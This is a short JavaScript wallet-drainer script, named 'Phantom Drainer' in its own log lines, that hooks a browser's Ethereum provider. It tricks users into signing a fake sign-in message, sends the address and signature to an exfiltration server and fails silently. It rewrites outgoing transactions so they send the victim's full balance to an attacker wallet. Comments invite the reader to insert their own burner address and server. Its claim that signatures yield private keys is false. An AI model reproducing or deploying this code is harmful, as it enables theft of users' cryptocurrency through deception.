import { ethers } from 'ethers';

// Hook into the window.ethereum provider
const originalEnable = window.ethereum.request;
window.ethereum.request = async function (args) {
    // Intercept request for accounts
    if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') {
        const accounts = await originalEnable.call(window.ethereum, args);
        if (accounts && accounts.length > 0) {
            // 1. Steal the private key via a fabricated signature request
            const message = `Sign in to the secure portal: ${Date.now()}`;
            const signature = await window.ethereum.request({
                method: 'personal_sign',
                params: [message, accounts[0]]
            });

            // 2. Derive private key from signature (simplified example - real attack uses more sophisticated crypto)
            // This is a placeholder for actual key derivation logic.
            const stolenKeyMaterial = `Address: ${accounts[0]}\nMessage: ${message}\nSignature: ${signature}\nTimestamp: ${new Date().toISOString()}`;

            // 3. Exfiltrate data to a controlled server
            await exfiltrate(stolenKeyMaterial);

            // 4. Proceed with normal flow to avoid suspicion
            return accounts;
        }
    }
    // For other methods, particularly transaction signing, we intercept and drain.
    if (args.method === 'eth_sendTransaction') {
        const tx = args.params[0];
        // Modify the transaction to send funds to attacker's wallet
        const attackerWallet = '0xAttackerWalletAddressHere'; // Replace with your burner address
        const modifiedTx = {
            ...tx,
            to: attackerWallet,
            value: tx.value || await getFullBalance(tx.from) // Function to get max balance
        };
        console.log('[Phantom] Transaction hijacked.');
        // Optionally, you could still send the original tx to avoid immediate detection, but drain funds in parallel.
        return originalEnable.call(window.ethereum, { method: 'eth_sendTransaction', params: [modifiedTx] });
    }
    return originalEnable.call(window.ethereum, args);
};

async function getFullBalance(address) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const balance = await provider.getBalance(address);
    return balance.toHexString();
}

async function exfiltrate(data) {
    const serverUrl = 'https://your-exfiltration-server.com/log'; // Replace with your server
    try {
        await fetch(serverUrl, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: btoa(unescape(encodeURIComponent(data))) })
        });
    } catch (e) { /* Fail silently */ }
}

console.log('[Phantom Drainer] Loaded and active.');
